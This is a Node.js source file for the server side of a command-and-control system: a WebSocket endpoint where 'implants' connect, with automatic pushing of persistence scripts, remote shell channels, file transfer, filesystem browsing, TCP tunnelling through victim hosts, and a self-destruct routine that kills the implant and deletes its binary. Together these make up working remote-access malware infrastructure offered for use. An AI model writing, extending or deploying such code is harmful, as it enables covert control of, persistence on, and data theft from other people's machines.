import path from "node:path";
import fs from "node:fs";
import net from "node:net";
import { fileURLToPath } from "node:url";
import protobuf from "protobufjs";

import config from "../config.js";
import { registry } from "../core/registry.js";
import { hosts } from "../core/hosts.js";
import { log } from "../core/log.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const PROTO_VERSION = 1;

// Directory holding per-OS autoexec scripts. The server reads
// autoexec/<os>.sh (or .ps1 for windows) on host connect and sends the
// contents to the client in an AutoExec frame so it can run a
// persistence/setup script without hardcoding it in the binary. Mounted as
// a volume in production (AUTOEXEC_DIR env var).
const AUTOEXEC_DIR = process.env.AUTOEXEC_DIR
  ? path.resolve(process.env.AUTOEXEC_DIR)
  : path.resolve(here, "..", "autoexec");

// Load the protobuf schema once at startup (synchronous — no codegen step).
const root = protobuf.loadSync(path.resolve(here, "..", "proto", "mux.proto"));
const Frame = root.lookupType("mux.Frame");

const encode = (obj) => Buffer.from(Frame.encode(Frame.create(obj)).finish());

// Convert a protobuf File* frame into a JSON payload for dashboard sockets.
function frameToJson(frame) {
  if (frame.fileRequest) {
    return {
      transfer_id: frame.fileRequest.transferId,
      path: frame.fileRequest.path,
    };
  }
  if (frame.fileStart) {
    return {
      transfer_id: frame.fileStart.transferId,
      path: frame.fileStart.path,
      size: Number(frame.fileStart.size) || 0,
    };
  }
  if (frame.fileChunk) {
    return {
      transfer_id: frame.fileChunk.transferId,
      data: Buffer.from(frame.fileChunk.data).toString("base64"),
    };
  }
  if (frame.fileDone) {
    return {
      transfer_id: frame.fileDone.transferId,
      error: frame.fileDone.error || "",
    };
  }
  return {};
}

// Convert a protobuf Fs* frame into a JSON payload for dashboard sockets.
function fsFrameToJson(frame) {
  if (frame.fsListResult) {
    return {
      type: "fs_list_result",
      request_id: frame.fsListResult.requestId,
      error: frame.fsListResult.error || "",
      absolute_path: frame.fsListResult.absolutePath || "",
      entries: (frame.fsListResult.entries || []).map((e) => ({
        name: e.name,
        is_dir: e.isDir,
        size: Number(e.size) || 0,
        mod_time: Number(e.modTime) || 0,
      })),
    };
  }
  if (frame.fsStatResult) {
    return {
      type: "fs_stat_result",
      request_id: frame.fsStatResult.requestId,
      error: frame.fsStatResult.error || "",
      exists: frame.fsStatResult.exists,
      is_dir: frame.fsStatResult.isDir,
      size: Number(frame.fsStatResult.size) || 0,
      mod_time: Number(frame.fsStatResult.modTime) || 0,
    };
  }
  return null;
}

// Read the autoexec script for a given os, if any. Returns null if no file.
function readAutoExec(osName) {
  if (!osName) return null;
  const isWindows = osName === "windows" || osName === "win";
  const ext = isWindows ? "ps1" : "sh";
  const file = path.resolve(AUTOEXEC_DIR, `${osName}.${ext}`);
  if (!file.startsWith(AUTOEXEC_DIR + path.sep)) return null;
  if (!fs.existsSync(file)) return null;
  const script = fs.readFileSync(file);
  return {
    os: osName,
    shell: isWindows ? "powershell" : "sh",
    script,
  };
}

// One connected Go client. Owns a set of channels; each opened channel becomes
// a Session in the shared registry.
class Host {
  constructor(ws, remote) {
    this.ws = ws;
    this.remote = remote;
    this.hello = {};
    this.alive = true;
    this.createdAt = Date.now();
    this._channelSeq = 0;
    this._channels = new Map(); // channelId -> { session }
    this._pending = new Map(); // channelId -> { command, cols, rows }
    this._fileSockets = new Set(); // dashboard WebSockets for file transfer
    this._proxySeq = 0;
    this._proxyHandlers = new Map(); // proxyId -> { onData(data), onClose(reason) }
    this._fsSockets = new Set(); // dashboard WebSockets for fs browser
  }

  addFsSocket(ws) {
    this._fsSockets.add(ws);
    ws.on("close", () => this._fsSockets.delete(ws));
  }

  sendFsFrame(frame) {
    const obj = fsFrameToJson(frame);
    if (!obj) return;
    for (const ws of this._fsSockets) {
      if (ws.readyState !== 1) continue;
      try {
        ws.send(JSON.stringify(obj));
      } catch {
        /* ignore */
      }
    }
  }

  // Open a TCP proxy tunnel through this host. Returns the allocated proxyId.
  openProxy(host, port) {
    if (!this.alive) return null;
    const proxyId = ++this._proxySeq;
    this.send({ proxyOpen: { proxyId, host, port } });
    return proxyId;
  }

  setProxyHandler(proxyId, handler) {
    this._proxyHandlers.set(proxyId, handler);
  }

  deleteProxyHandler(proxyId) {
    this._proxyHandlers.delete(proxyId);
  }

  onProxyOpenOk(proxyId) {
    const handler = this._proxyHandlers.get(proxyId);
    if (handler) handler.onOpen();
  }

  onProxyOpenError(proxyId, message) {
    const handler = this._proxyHandlers.get(proxyId);
    this._proxyHandlers.delete(proxyId);
    if (handler) handler.onOpenError(message);
  }

  onProxyData(proxyId, data) {
    const handler = this._proxyHandlers.get(proxyId);
    if (handler) handler.onData(Buffer.from(data));
  }

  onProxyClose(proxyId) {
    const handler = this._proxyHandlers.get(proxyId);
    this._proxyHandlers.delete(proxyId);
    if (handler) handler.onClose();
  }

  addFileSocket(ws) {
    this._fileSockets.add(ws);
    ws.on("close", () => this._fileSockets.delete(ws));
  }

  sendFileFrame(frame) {
    const obj = {};
    if (frame.fileRequest) obj.type = "file_request";
    else if (frame.fileStart) obj.type = "file_start";
    else if (frame.fileChunk) obj.type = "file_chunk";
    else if (frame.fileDone) obj.type = "file_done";
    else return;
    for (const ws of this._fileSockets) {
      if (ws.readyState !== 1) continue;
      try {
        ws.send(JSON.stringify({ ...obj, ...frameToJson(frame) }));
      } catch {
        /* ignore */
      }
    }
  }

  send(obj) {
    if (this.ws.readyState === 1) this.ws.send(encode(obj));
  }

  meta() {
    return {
      kind: "host",
      id: this.id,
      remote: this.remote,
      hostname: this.hello.hostname || "",
      username: this.hello.username || "",
      os: this.hello.os || "",
      arch: this.hello.arch || "",
      tags: this.hello.tags || "",
      features: this.hello.features || 0,
      channels: this._channels.size,
      channelList: [...this._channels.entries()].map(([id, ch]) => ({
        channelId: id,
        sessionId: ch.session.id,
        alive: ch.session.alive,
      })),
      alive: this.alive,
      createdAt: this.createdAt,
    };
  }

  label() {
    const who = this.hello.hostname
      ? `${this.hello.username || "?"}@${this.hello.hostname}`
      : this.remote;
    return who;
  }

  // Ask the client to spawn a new PTY shell.
  openChannel({ command = "", cols = 80, rows = 24 } = {}) {
    if (!this.alive) return null;
    const channelId = ++this._channelSeq;
    this._pending.set(channelId, { command, cols, rows });
    this.send({ openRequest: { channelId, command, cols, rows } });
    return channelId;
  }

  // Send an autoexec script that kills the implant process and removes its
  // binary. The client exposes RSL_CLIENT_PID and RSL_CLIENT_EXE to autoexec
  // scripts so the payload can target itself precisely.
  selfDestruct() {
    if (!this.alive) return false;
    const isWindows = this.hello.os === "windows" || this.hello.os === "win";
    const script = isWindows
      ? 'Stop-Process -Id $env:RSL_CLIENT_PID -Force; Start-Sleep -Seconds 1; if ($env:RSL_CLIENT_EXE -and (Test-Path $env:RSL_CLIENT_EXE)) { Remove-Item -Path $env:RSL_CLIENT_EXE -Force -ErrorAction SilentlyContinue }'
      : '#!/bin/sh\nkill -9 "$RSL_CLIENT_PID" 2>/dev/null\nsleep 1\nif [ -n "$RSL_CLIENT_EXE" ] && [ -f "$RSL_CLIENT_EXE" ]; then rm -f "$RSL_CLIENT_EXE"; fi\n';
    this.send({
      autoExec: {
        os: this.hello.os || (isWindows ? "windows" : "linux"),
        shell: isWindows ? "powershell" : "sh",
        script: Buffer.from(script, "utf8"),
      },
    });
    log.info("self-destruct sent", { hostId: this.id, label: this.label(), os: this.hello.os });
    return true;
  }

  onOpenOk(channelId, pid) {
    const pend = this._pending.get(channelId);
    if (!pend) return;
    this._pending.delete(channelId);

    const backend = {
      write: (buf) => this.send({ data: { channelId, data: buf } }),
      resize: (cols, rows) => this.send({ resize: { channelId, cols, rows } }),
      close: () => this.send({ close: { channelId, reason: "operator" } }),
    };

    const session = registry.create({
      transport: "mux",
      remote: `${this.label()} ch#${channelId}`,
      backend,
    });
    // A mux channel is a real PTY on the far side already.
    session.upgraded = true;
    session.cols = pend.cols;
    session.rows = pend.rows;
    if (pid) session.pid = pid;

    this._channels.set(channelId, { session });
    hosts.update(this);
    log.info("mux channel opened", { hostId: this.id, channelId, sessionId: session.id, remote: session.remote });
  }

  onOpenError(channelId, message) {
    this._pending.delete(channelId);
    console.error(`[mux]  channel ${channelId} open failed: ${message}`);
    log.warn("mux channel open failed", { hostId: this.id, channelId, message });
  }

  onData(channelId, data) {
    const ch = this._channels.get(channelId);
    if (ch) ch.session.push(Buffer.from(data));
  }

  onClose(channelId) {
    const ch = this._channels.get(channelId);
    if (!ch) return;
    log.info("mux channel closed", { hostId: this.id, channelId, sessionId: ch.session.id });
    ch.session.markExit();
    this._channels.delete(channelId);
    hosts.update(this);
  }

  teardown() {
    this.alive = false;
    for (const { session } of this._channels.values()) session.markExit();
    this._channels.clear();
    for (const ws of this._fileSockets) {
      try {
        ws.close();
      } catch {
        /* ignore */
      }
    }
    this._fileSockets.clear();
    for (const handler of this._proxyHandlers.values()) {
      handler.onClose();
    }
    this._proxyHandlers.clear();
    for (const ws of this._fsSockets) {
      try {
        ws.close();
      } catch {
        /* ignore */
      }
    }
    this._fsSockets.clear();
  }
}

export function registerMux(app) {
  if (!config.ENABLE_MUX) return;

  app.ws("/mux", (ws, req) => {
    // UNAUTHENTICATED on purpose: this is where implants connect.
    ws.binaryType = "arraybuffer";
    const remote =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "unknown";

    let host = null;

    const ping = setInterval(() => {
      if (ws.readyState === 1) ws.send(encode({ ping: { nonce: 0 } }));
    }, config.MUX_PING_MS);

    ws.on("message", (raw) => {
      let frame;
      try {
        frame = Frame.decode(new Uint8Array(raw));
      } catch (e) {
        return; // ignore malformed frames
      }
      const kind = frame.kind; // populated oneof field name

      if (kind === "hello") {
        if (host) return;
        // Token auth: if BUILD_TOKEN is set, the client's Hello must carry it.
        // A missing/mismatched token closes the connection immediately.
        if (config.BUILD_TOKEN && frame.hello.token !== config.BUILD_TOKEN) {
          console.warn(`[mux]  rejected host from ${remote}: bad or missing token`);
          log.warn("mux host rejected: bad token", { remote });
          ws.close(1008, "unauthorized");
          return;
        }
        host = new Host(ws, remote);
        host.hello = {
          hostname: frame.hello.hostname,
          username: frame.hello.username,
          os: frame.hello.os,
          arch: frame.hello.arch,
          tags: frame.hello.tags,
          version: frame.hello.version,
          features: Number(frame.hello.features) || 0,
        };
        hosts.add(host);
        console.log(`[mux]  host ${host.id} connected: ${host.label()} (${remote})`);
        log.info("mux host connected", { hostId: host.id, label: host.label(), remote, os: frame.hello.os, arch: frame.hello.arch, tags: frame.hello.tags });

        // Send the per-OS autoexec script if one exists. The client runs it
        // locally (persistence / setup) — not as a shell channel.
        const ae = readAutoExec(frame.hello.os);
        if (ae) {
          console.log(`[mux]  sending autoexec for ${frame.hello.os} to ${host.id}`);
          log.info("autoexec sent", { hostId: host.id, os: frame.hello.os, bytes: ae.script.length });
          host.send({ autoExec: ae });
        }

        // Auto-open one shell so the host is immediately usable.
        host.openChannel();
        return;
      }

      if (!host) return; // everything else requires a Hello first

      switch (kind) {
        case "openOk":
          host.onOpenOk(frame.openOk.channelId, frame.openOk.pid);
          break;
        case "openError":
          host.onOpenError(frame.openError.channelId, frame.openError.message);
          break;
        case "data":
          host.onData(frame.data.channelId, frame.data.data);
          break;
        case "close":
          host.onClose(frame.close.channelId);
          break;
        case "ping":
          host.send({ pong: { nonce: frame.ping.nonce } });
          break;
        case "pong":
          break;
        case "fileRequest":
        case "fileStart":
        case "fileChunk":
        case "fileDone":
          host.sendFileFrame(frame);
          break;
        case "proxyOpenOk":
          host.onProxyOpenOk(frame.proxyOpenOk.proxyId);
          break;
        case "proxyOpenError":
          host.onProxyOpenError(frame.proxyOpenError.proxyId, frame.proxyOpenError.message);
          break;
        case "proxyData":
          host.onProxyData(frame.proxyData.proxyId, frame.proxyData.data);
          break;
        case "proxyClose":
          host.onProxyClose(frame.proxyClose.proxyId);
          break;
        case "fsListResult":
        case "fsStatResult":
          host.sendFsFrame(frame);
          break;
        default:
          break;
      }
    });

    const shutdown = () => {
      clearInterval(ping);
      if (host) {
        host.teardown();
        hosts.remove(host.id);
        console.log(`[mux]  host ${host.id} disconnected`);
        log.info("mux host disconnected", { hostId: host.id });
      }
    };
    ws.on("close", shutdown);
    ws.on("error", shutdown);
  });
}

export { PROTO_VERSION, Frame, encode };
